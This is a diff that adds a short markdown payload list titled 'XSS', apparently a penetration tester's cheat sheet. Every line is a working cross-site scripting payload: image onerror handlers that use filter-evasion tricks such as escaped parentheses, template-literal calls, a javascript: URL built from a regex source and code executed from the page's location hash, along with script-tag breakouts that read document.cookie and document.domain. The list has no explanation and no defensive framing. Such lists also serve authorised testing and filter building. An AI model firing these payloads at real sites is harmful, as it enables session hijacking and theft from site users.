@@ -1,0 +1,17 @@
+# XSS
+
+<img src="" onerror="innerHTML=decodeURIComponent.call`${location.hash}`" "="">
+<img src="" onerror="innerHTML='<img/src/onerror=alert\u00281337\u0029>'" "="">
+<img src="" onerror="location=/javascript:/.source+location" "="">
+<img src="" onerror="window.onerror=alert;throw 1337" "="">
+<img src="" onerror="alert&1par;1337&rpar;" "="">
+<img src="" onerror="alert`1337`" "="">
+javascript:alert(document.cookie)
+"><img src=x onerror=alert(document.domain)>
+"><script>alert(1)</script>
+"><script>alert(document.domain)</script>
+"><script>alert(document.cookie)</script>
+"><script>prompt(1)</script>
+"><script>prompt(document.domain)</script>
+"><script>prompt(document.cookie)</script>
+"><svg><script>alert(1)</script>
